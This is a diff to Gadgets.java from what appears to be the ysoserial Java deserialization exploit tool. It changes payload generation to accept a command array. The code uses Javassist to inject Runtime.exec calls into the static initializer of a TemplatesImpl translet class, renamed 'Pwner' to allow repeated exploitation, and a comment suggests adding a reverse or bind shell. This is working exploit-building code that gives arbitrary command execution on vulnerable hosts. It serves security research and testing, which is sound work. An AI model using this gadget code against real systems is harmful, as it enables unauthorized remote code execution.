@@ -93,24 +93,23 @@ public class Gadgets {
 
 
 
-    public static Object createTemplatesImpl ( final String command) throws Exception {
-        return createTemplatesImpl(command, null);
+    public static Object createTemplatesImpl ( final String ... command) throws Exception {
+        return createTemplatesImpl(null, command);
     }
 
-    public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception {
+    public static Object createTemplatesImpl (final Class c, String ... command) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
-            return createTemplatesImpl(
-                command, c,
+            return createTemplatesImpl(c,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"), command);
         }
 
-        return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, command);
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl (Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String ... command)
             throws Exception {
         final T templates = tplClass.newInstance();
         final byte[] classBytes;
@@ -122,9 +121,18 @@ public class Gadgets {
             final CtClass clazz = pool.get(StubTransletPayload.class.getName());
             // run command in static initializer
             // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");";
+            StringBuilder stringBuilder = new StringBuilder("new java.lang.String[] {");
+            for (int i = 0; i < command.length; i++) {
+                stringBuilder.append("\"");
+                stringBuilder.append(command[i].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
+                stringBuilder.append("\"");
+                if (i != command.length - 1) {
+                    stringBuilder.append(",");
+                }
+            }
+            stringBuilder.append("}");
+            String cmd = String.format("java.lang.Runtime.getRuntime().exec(%s);", stringBuilder.toString());
+            System.out.println(cmd);
             clazz.makeClassInitializer().insertAfter(cmd);
             // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
             clazz.setName("ysoserial.Pwner" + System.nanoTime());
